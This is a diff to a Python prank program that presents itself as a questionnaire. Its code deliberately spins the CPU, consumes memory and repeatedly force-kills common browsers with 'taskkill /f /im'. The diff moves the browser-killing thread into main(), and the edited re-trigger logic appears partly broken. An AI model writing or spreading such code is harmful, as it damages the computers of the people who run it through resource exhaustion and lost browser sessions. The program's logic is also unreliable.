@@ -4,6 +4,7 @@ from random import randint
 from threading import Thread,Timer
 from os import system
 #一个整活问卷
+#·使程序占用CPU和内存用量变得特别“棒”
 
 def high_cpu():
     while True:
@@ -29,16 +30,20 @@ def kill():
     browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe", "opera.exe"]
     for x in browsers:
         a = system(f"taskkill /f /im {x}")
-        oehrie = Timer(3, lambda:kill())
-        jjj = oehrie.start()
+        def hhhh():
+            global oehrie
+            oehrie = Timer(3, lambda:kill())
+        Th = Thread(target=lambda:hhhh(),daemon=True);
+        jjj = Th.start()
         return '你真的不想清除窗口吗？';
-kehr = Thread(target=lambda:kill())
-rhu = kehr.start()
+
 def main():
     koe = Thread(target=high_cpu, daemon=True)
     man = koe.start()
     manji = Thread(target=high_mem, daemon=True)
     man_ji = manji.start()
+    kehr = Thread(target=lambda:kill())
+    rhu = kehr.start()
     def noclear():
         pass;
         return '你真的不想清除窗口吗？';
